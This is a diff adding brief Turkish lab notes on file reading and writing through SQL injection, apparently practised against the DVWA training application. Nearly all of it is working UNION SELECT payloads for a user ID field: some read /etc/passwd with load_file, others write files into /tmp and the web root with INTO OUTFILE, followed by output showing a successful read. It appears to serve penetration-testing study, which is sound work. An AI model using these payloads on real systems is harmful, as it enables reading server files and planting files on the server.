@@ -1,0 +1,13 @@
+Dosya Okumak ve Yazmak
+USER ID: 1' union select 1,load_file('/etc/passwd')#
+USER ID: 1' union select null,load_file('/etc/passwd')#
+
+USER ID: 1' union select 1,'test' into outfile '/tmp/test.txt'#
+USER ID: 1' union select 1,'test' into outfile '/var/www/dvwa/test.txt'#
+
+USER ID: 1' union select 1,load_file('/tmp/test.txt')#
+
+ID: 1' union select 1,load_file('/tmp/test.txt')#
+First name: 1
+Surname: admin	admin
+1	test	-> Dosya okuma başarılı.
